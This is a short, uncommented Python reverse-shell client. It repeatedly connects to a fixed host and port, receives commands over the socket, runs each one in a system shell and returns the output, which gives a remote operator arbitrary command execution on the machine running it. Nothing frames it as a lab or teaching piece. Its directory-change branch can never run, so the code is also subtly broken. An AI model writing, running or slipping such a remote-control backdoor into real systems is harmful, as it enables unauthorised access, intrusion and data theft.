import socket
import time
import os
import subprocess
import platform
import psutil

OS = platform.system()
HOST = socket.gethostbyname(socket.gethostname())
PORT = 12345


# noinspection SpellCheckingInspection
def handle_conn():
    print("[Connection established]")
    while True:
        try:
            data_length = sock.recv(50).decode('utf-8')
            cmd = sock.recv(int(data_length)).decode('utf-8')
            if cmd == 'os.getcwd()':
                sock.send(get_cwd().encode('utf-8'))
            else:
                sock.send(process_cmd(cmd).encode('utf-8'))
        except:
            sock.close()
            break


def get_cwd():
    return str(os.getcwd()) + '> '


# def kill(proc_pid):
#     process = psutil.Process(proc_pid)
#     for proc in process.children(recursive=True):
#         proc.kill()
#     process.kill()


def process_cmd(cmd):
    if len(cmd) > 0:
        proc = subprocess.Popen(cmd[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # kill(proc.pid)
        output = proc.stdout.read() + proc.stderr.read()
        output = output.decode('utf-8')
        return output
    elif cmd[:2] == 'cd':
        os.chdir(cmd[3:])
        return ''
    return 'Received NULL command'


# Brute force connection to the server
secs = 0
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        handle_conn()
        time.sleep(5)
        secs = 0
    except:
        if OS == 'Windows':
            os.system('cls')
        else:
            os.system('clear')

        secs += 1
        print(f"Trying to reach the server [{secs} elapsed]")